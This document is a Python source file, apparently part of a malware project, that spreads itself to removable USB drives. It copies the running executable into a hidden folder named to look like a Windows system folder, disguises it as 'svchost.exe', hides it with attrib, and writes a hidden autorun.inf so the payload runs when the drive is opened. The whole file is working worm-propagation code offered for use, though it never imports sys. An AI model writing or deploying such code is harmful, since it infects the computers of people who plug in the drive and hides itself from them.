"""
USB Spread Module
Infects removable drives
"""

import os
import shutil
import win32api
import win32con
import win32file
import subprocess
import logging

class USBSpread:
    def __init__(self):
        self.hidden_folder = '.SystemVolumeInformation'
        self.paylod_name = 'svchost.exe'
        self.autorun_name = 'autorun.inf'
        
        logging.info("[*] USB Spread initialized")
    
    def infect(self):
        """Infect all removable drives"""
        drives = self._get_removable_drives()
        
        for drive in drives:
            if not self._is_infected(drive):
                self._infect_drive(drive)
        
        logging.info(f"[✓] USB infection attempted on {len(drives)} drives")
    
    def _get_removable_drives(self):
        """Get list of removable drives"""
        drives = []
        for drive in win32api.GetLogicalDriveStrings().split('\x00'):
            if drive:
                type = win32file.GetDriveType(drive)
                if type == win32con.DRIVE_REMOVABLE:
                    drives.append(drive)
        return drives
    
    def _is_infected(self, drive):
        """Check if drive is already infected"""
        hidden_path = os.path.join(drive, self.hidden_folder)
        return os.path.exists(hidden_path)
    
    def _infect_drive(self, drive):
        """Infect a removable drive"""
        try:
            # Create hidden folder
            hidden_path = os.path.join(drive, self.hidden_folder)
            os.makedirs(hidden_path, exist_ok=True)
            
            # Hide folder
            subprocess.run(['attrib', '+h', '+s', '+r', hidden_path], capture_output=True)
            
            # Copy payload
            payload_path = os.path.join(hidden_path, self.paylod_name)
            if os.path.exists(sys.executable):
                shutil.copy2(sys.executable, payload_path)
                subprocess.run(['attrib', '+h', '+s', '+r', payload_path], capture_output=True)
            
            # Create autorun.inf
            autorun_path = os.path.join(drive, self.autorun_name)
            with open(autorun_path, 'w') as f:
                f.write(f"""
[AutoRun]
open={payload_path}
action=Open folder to view files
shell\\open\command={payload_path}
shell\\open\default=1
                """)
            
            # Hide autorun
            subprocess.run(['attrib', '+h', '+s', '+r', autorun_path], capture_output=True)
            
            logging.info(f"[✓] Drive infected: {drive}")
            return True
            
        except Exception as e:
            logging.error(f"Drive infection failed for {drive}: {e}")
            return False